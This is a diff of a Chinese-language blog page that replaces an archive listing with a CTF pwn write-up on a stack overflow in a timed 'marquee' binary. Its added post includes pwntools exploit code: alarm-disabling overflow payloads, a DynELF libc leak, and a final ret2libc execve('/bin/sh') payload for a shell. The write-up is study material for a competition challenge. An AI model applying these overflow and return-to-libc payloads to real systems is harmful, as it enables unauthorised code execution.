@@ -7,15 +7,20 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <meta name="baidu-site-verification" content="RNCre9JfIO" />
   <link rel="dns-prefetch" href="https://sunichi.github.io">
-  <title>Archives: 2018 | Sunichi&#39;s Blog</title>
+  <title>cyberearth xctf pwn stack writeup | Sunichi&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sunichi&#39;s Blog">
-<meta property="og:url" content="https://sunichi.github.io/archives/2018/index.html">
+  <meta name="description" content="第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee();">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberearth xctf pwn stack writeup">
+<meta property="og:url" content="https://sunichi.github.io/2018/02/02/cyberearth-xctf-pwn-stack/index.html">
 <meta property="og:site_name" content="Sunichi&#39;s Blog">
+<meta property="og:description" content="第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee();">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-02-02T06:19:27.937Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sunichi&#39;s Blog">
+<meta name="twitter:title" content="cyberearth xctf pwn stack writeup">
+<meta name="twitter:description" content="第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee();">
   
     <link rel="alternative" href="/atom.xml" title="Sunichi&#39;s Blog" type="application/atom+xml">
   
@@ -149,36 +154,69 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-cyberearth-xctf-pwn-stack" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      cyberearth xctf pwn stack writeup
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/02/02/cyberearth-xctf-pwn-stack/" class="archive-article-date">
+
+        
+        <a href="/2018/02/02/cyberearth-xctf-pwn-stack/" class="archive-article-date">
   	<time datetime="2018-02-02T06:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-02</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/02/02/cyberearth-xctf-pwn-stack/">cyberearth xctf pwn stack writeup</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。</p>
+<p>先丢到<code>ida</code>中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环<code>handler</code>。在跑马灯结束到触发<code>alarm</code>之前，有一个窗口可以提供输入。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">signal(<span class="number">14</span>, (<span class="keyword">__sighandler_t</span>)handler);</span><br><span class="line">alarm(<span class="number">2u</span>);</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line"><span class="keyword">return</span> gee();</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>提供输入在<code>gee</code>函数内，<code>buf</code>长度为0x88，<code>read</code>读入上限为0x100，可以溢出，offset为140。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"*..........................................................."</span>);</span><br><span class="line"><span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);                 <span class="comment">// buf length 0x88 overflow</span></span><br></pre></td></tr></table></figure>
+<p>通过简单的实验可知，先前的<code>signal</code>和<code>alarm</code>可以被后来的<code>signal</code>和<code>alarm</code>所覆盖，因此首先通过溢出令<code>alarm(2u)</code>失效。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wait</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'*...........................................................'</span>)</span><br><span class="line"><span class="comment"># disable alarm</span></span><br><span class="line"><span class="comment"># 0x8048b5e call gee</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">140</span> + p32(alarm_plt) + p32(<span class="number">0x8048b5e</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p>编写<code>leak</code>函数并进行泄漏：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">140</span> + p32(write_plt) + p32(<span class="number">0x8048b5e</span>)  + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> p.recvuntil(<span class="string">'...\n'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print data</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./stack'</span>), libcdb=<span class="keyword">False</span>)</span><br><span class="line">execve_addr = d.lookup(<span class="string">'execve'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'execve:'</span> + hex(execve_addr)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system:'</span> + hex(system_addr)</span><br><span class="line">libcbase_addr = d.bases()[<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc base addr:'</span> + hex(libcbase_addr)</span><br></pre></td></tr></table></figure>
+<p>在实际做题中，可以根据泄漏的函数地址找到对应的libc版本从而获取<code>/bin/sh</code>的偏移地址，由于没有环境，故直接导入本地libc。曾经尝试调用<code>system</code>并通过<code>read</code>读入<code>/bin/sh</code>字符串，但失败（包括先调用<code>start</code>恢复栈帧）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">binsh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'/bin/sh offset:'</span> + hex(binsh_offset)</span><br><span class="line">binsh_addr = libcbase_addr + binsh_offset</span><br></pre></td></tr></table></figure>
+<p>调用execve即可拿到shell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">140</span> + p32(execve_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -194,187 +232,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://sunichi.github.io/2018/02/02/cyberearth-xctf-pwn-stack/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/09/rctf15-welpwn/" class="archive-article-date">
-  	<time datetime="2018-01-09T00:55:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-09</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/01/09/rctf15-welpwn/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">rctf2015 welpwn writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/09/rctf15-welpwn/">rctf2015 welpwn writeup</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/07/lctf16-pwn100/" class="archive-article-date">
-  	<time datetime="2018-01-07T03:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/07/lctf16-pwn100/">lctf15 pwn100 writeup</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/06/xdctf15-pwn200/" class="archive-article-date">
-  	<time datetime="2018-01-06T09:13:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-06</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/06/xdctf15-pwn200/">xdctf15 pwn200 writeup</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/01/05/pwnable-tw-start/" class="archive-article-date">
-  	<time datetime="2018-01-05T10:33:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/01/05/pwnable-tw-start/">Pwnable.tw start writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -397,8 +354,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
